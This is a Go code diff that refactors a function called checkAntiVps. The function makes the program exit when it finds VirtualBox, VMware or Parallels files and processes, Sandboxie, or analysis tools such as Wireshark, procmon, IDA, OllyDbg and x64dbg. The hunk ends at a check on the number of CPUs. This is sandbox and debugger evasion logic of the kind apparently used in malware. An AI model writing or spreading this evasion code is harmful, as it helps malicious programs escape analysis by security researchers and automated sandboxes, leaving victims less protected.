@@ -199,44 +199,64 @@ func checkAntiVps() {
 		return
 	}
 
-	if checkFileExists(`C:\Windows\System32\VBox*.dll`) ||
-		checkFileExists(`C:\Windows\System32\VBoxHook.dll`) ||
-		checkFileExists(`C:\Windows\System32\VBoxGuest.sys`) ||
-		checkFileExists(`C:\Windows\System32\VBoxMouse.sys`) ||
-		checkFileExists(`C:\Windows\System32\VBoxSF.sys`) {
-		os.Exit(1)
+	vboxFiles := []string{
+		"C:\\Windows\\System32\\VBox*.dll",
+		"C:\\Windows\\System32\\VBoxHook.dll",
+		"C:\\Windows\\System32\\VBoxGuest.sys",
+		"C:\\Windows\\System32\\VBoxMouse.sys",
+		"C:\\Windows\\System32\\VBoxSF.sys",
+	}
+	for _, file := range vboxFiles {
+		if checkFileExists(file) {
+			os.Exit(1)
+		}
 	}
 
-	if checkFileExists(`C:\Windows\System32\vmware-vmx.exe`) ||
-		checkFileExists(`C:\Windows\System32\vmware-vmx-stats.exe`) ||
-		checkFileExists(`C:\Windows\System32\vmware-vmx-debug.exe`) {
-		os.Exit(1)
+	vmwareFiles := []string{
+		"C:\\Windows\\System32\\vmware-vmx.exe",
+		"C:\\Windows\\System32\\vmware-vmx-stats.exe",
+		"C:\\Windows\\System32\\vmware-vmx-debug.exe",
+	}
+	for _, file := range vmwareFiles {
+		if checkFileExists(file) {
+			os.Exit(1)
+		}
 	}
 
-	if checkProcessRunning("VBoxTray.exe") ||
-		checkProcessRunning("VBoxService.exe") ||
-		checkProcessRunning("vmtoolsd.exe") ||
-		checkProcessRunning("VMwareTray.exe") ||
-		checkProcessRunning("VMwareUser.exe") ||
-		checkProcessRunning("prl_tools.exe") ||
-		checkProcessRunning("prl_cc.exe") {
-		os.Exit(1)
+	vmProcesses := []string{
+		"VBoxTray.exe",
+		"VBoxService.exe",
+		"vmtoolsd.exe",
+		"VMwareTray.exe",
+		"VMwareUser.exe",
+		"prl_tools.exe",
+		"prl_cc.exe",
+	}
+	for _, proc := range vmProcesses {
+		if checkProcessRunning(proc) {
+			os.Exit(1)
+		}
 	}
 
-	if checkProcessRunning("SandboxieRpcSs.exe") ||
-		checkProcessRunning("SandboxieDcomLaunch.exe") ||
-		checkProcessRunning("SbieSvc.exe") ||
-		checkProcessRunning("procmon.exe") ||
-		checkProcessRunning("procmon64.exe") ||
-		checkProcessRunning("wireshark.exe") ||
-		checkProcessRunning("fiddler.exe") ||
-		checkProcessRunning("ollydbg.exe") ||
-		checkProcessRunning("idaq.exe") ||
-		checkProcessRunning("idaq64.exe") ||
-		checkProcessRunning("x64dbg.exe") ||
-		checkProcessRunning("x32dbg.exe") ||
-		checkProcessRunning("windbg.exe") {
-		os.Exit(1)
+	sandboxProcesses := []string{
+		"SandboxieRpcSs.exe",
+		"SandboxieDcomLaunch.exe",
+		"SbieSvc.exe",
+		"procmon.exe",
+		"procmon64.exe",
+		"wireshark.exe",
+		"fiddler.exe",
+		"ollydbg.exe",
+		"idaq.exe",
+		"idaq64.exe",
+		"x64dbg.exe",
+		"x32dbg.exe",
+		"windbg.exe",
+	}
+	for _, proc := range sandboxProcesses {
+		if checkProcessRunning(proc) {
+			os.Exit(1)
+		}
 	}
 
 	if runtime.NumCPU() < 2 {
